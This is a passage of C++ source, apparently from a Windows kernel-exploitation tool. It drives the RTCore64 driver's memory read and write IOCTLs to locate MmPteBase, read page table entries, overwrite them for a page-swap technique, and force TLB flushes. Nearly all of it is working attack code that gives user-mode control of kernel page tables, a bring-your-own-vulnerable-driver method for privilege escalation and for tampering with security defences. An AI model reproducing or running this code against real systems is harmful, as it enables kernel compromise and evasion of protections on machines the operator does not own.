            else if (val & ((1ULL<<39)-1))           status = "not-512GB-aligned";
            else                                     status = "*** CANDIDATE ***";
            printf("  0x%08X  %-6d  0x%016llX  %s\n", rva, cnt, val, status);
        }
        if (ranked.empty()) printf("  (no candidates found)\n");
        printf("\n");
    }

    // ── Section 2: Reference-count scan ──────────────────────────────────────
    printf("=== Method 2: Highest-reference-count .data global ===\n\n");
    {
        std::map<DWORD,int> refCnt;
        DWORD end = img.textFOA + img.textSz;
        for (DWORD i = img.textFOA; i + 7 < end; i++) {
            DWORD rva = DecodeRipRelDataRef(buf, i, img.textFOA, img.textRVA,
                                           img.dataRVA, img.dataEnd);
            if (rva) refCnt[rva]++;
        }

        std::vector<std::pair<int,DWORD>> topN;
        topN.reserve(refCnt.size());
        for (auto& kv : refCnt) topN.push_back({kv.second, kv.first});
        std::sort(topN.begin(), topN.end(), [](auto& a, auto& b){ return a.first > b.first; });

        printf("  %-4s  %-10s  %-8s  %-18s  %s\n", "Rank", "RVA", "Refs", "RuntimeValue", "Status");
        printf("  %-4s  %-10s  %-8s  %-18s  %s\n", "----", "----------", "--------", "------------------", "------");
        size_t limit = topN.size() < 64 ? topN.size() : 64;
        for (size_t rank = 0; rank < limit; rank++) {
            DWORD   rva  = topN[rank].second;
            int     cnt  = topN[rank].first;
            DWORD64 val  = g_drv->Rd64(img.kBase + rva);
            const char* status;
            if (!g_drv->IsKernelVA(val))         status = "not-kernel-VA";
            else if (val & ((1ULL<<39)-1))        status = "not-512GB-aligned";
            else                                  status = "*** CANDIDATE ***";
            printf("  %-4zu  0x%08X  %-8d  0x%016llX  %s\n", rank, rva, cnt, val, status);
        }
        printf("\n  Total unique .data targets referenced: %zu\n", refCnt.size());
    }
}

// Each PTE covers 4096 bytes.  Byte offset into PTE array = (va >> 12) * 8 = va >> 9.
// Works for the full canonical 48-bit VA space.
DWORD64 PteVaOf(DWORD64 va) {
    DWORD64 base = GetMmPteBase();
    if (!base) return 0;
    // PTE byte offset = page_frame_number * 8 = (va >> 12) * 8.
    // Mask off sign-extension AND sub-page bits before dividing, so the result
    // is always QWORD-aligned (required by the ReadPte alignment guard).
    DWORD64 idx = (va & 0x0000FFFFFFFFF000ULL) >> 9;
    return base + idx;
}

bool IsVaMapped(DWORD64 va) {
    if (!s_pteBase || !va) return false;
    DWORD64 pteVA = s_pteBase + ((va & 0x0000FFFFFFFFF000ULL) >> 9);
    if (!g_drv->IsKernelVA(pteVA) || (pteVA & 7)) return false;
    // pteVA is in the PTE self-map region; the PTE self-map itself is always
    // mapped for kernel VAs when MmPteBase is correct, so this read is safe.
    DWORD64 pte = g_drv->Rd64(pteVA);
    return (pte & PTE_PRESENT) != 0;
}

PteInfo ReadPte(DWORD64 va) {
    PteInfo info{};
    info.pte_va = PteVaOf(va);
    if (!info.pte_va || !g_drv->IsKernelVA(info.pte_va)) {
        info.valid = false;
        return info;
    }
    if (info.pte_va & 7) {  // PTE array is always QWORD-aligned; guard anyway
        info.valid = false;
        return info;
    }

    info.valid    = true;
    info.pte_val  = g_drv->Rd64(info.pte_va);
    info.page_pa  = info.pte_val & PTE_PA_MASK;
    info.present   = (info.pte_val & PTE_PRESENT) != 0;
    info.writable  = (info.pte_val & PTE_WRITE)   != 0;
    info.user      = (info.pte_val & PTE_USER)     != 0;
    info.executable= (info.pte_val & PTE_NX)       == 0;
    return info;
}

bool WritePte(DWORD64 va, DWORD64 newPteVal) {
    DWORD64 pteVA = PteVaOf(va);
    if (!pteVA || !g_drv->IsKernelVA(pteVA)) return false;

    // RTCore64's IOCTL_WRITE only reliably handles Size=1/2/4.
    // Size=8 appears to return OK but silently writes nothing (no case in the
    // dispatch table for Size=8).  Use explicit hi→lo two-DWORD writes instead.
    //
    // Write order: hi first (keeps old lo/PA → Present=1 throughout briefly
    // inconsistent PA), then lo (atomically commits new PA with new flags).
    // On x86-64, aligned DWORD stores are always single-copy atomic (SDM §8.2.3.1),
    // so each half is individually safe; the brief PA mismatch window is harmless
    // for our PTE-swap use case because we own both pages during the window.
    DWORD loWord = (DWORD)(newPteVal & 0xFFFFFFFF);
    DWORD hiWord = (DWORD)(newPteVal >> 32);
    g_drv->Wr32(pteVA + 4, hiWord);
    g_drv->Wr32(pteVA,     loWord);
    printf("[pte] WritePte VA=0x%016llX PTE=0x%016llX (hi-lo Wr32 pair)\n",
           va, newPteVal);
    return true;
}

// Flush TLB for 'va' using MapPhys + WRITE IOCTL + UnmapPhys.
//
// Flow:
//   1. ReadPte(va) → get physical address of va's page
//   2. MapPhys(PA, 0x1000) → fresh kernel VA with no stale TLB entry
//   3. Wr8(mapped + offset, curByte) → WRITE IOCTL acts as I/O serialization barrier
//      ("jump back to WRITE" = reuse RTCore64 WRITE IOCTL 0x8000204C)
//   4. UnmapPhys → MmUnmapIoSpace internally broadcasts TLB flush
//
// Replaces: newPte &= ~PTE_GLOBAL; SwitchToThread(); Sleep(5);
// Falls back to SwitchToThread() if MapPhys is unavailable.
bool FlushTlb(DWORD64 va) {
    PteInfo pte = ReadPte(va);
    if (!pte.valid || !pte.present || pte.page_pa == 0) {
        SwitchToThread();
        Sleep(5);
        return false;
    }

    DWORD64 mapped = g_drv->MapPhys(pte.page_pa, 0x1000);
    if (!mapped) {
        if (g_debug)
            printf("[pte] FlushTlb: MapPhys failed, falling back to SwitchToThread\n");
        SwitchToThread();
        Sleep(5);
        return false;
    }

    // WRITE IOCTL: read-back the byte and write it unchanged.
    // This is the I/O serialization step — forces RTCore64 to execute a kernel
    // write through the fresh mapping, which acts as a store barrier and
    // ensures the physical page is in a coherent state before UnmapPhys.
    DWORD64 offset = va & 0xFFF;
    BYTE cur = g_drv->Rd8(mapped + offset);
    g_drv->Wr8(mapped + offset, cur);

    g_drv->UnmapPhys(mapped, 0x1000);
    return true;
}
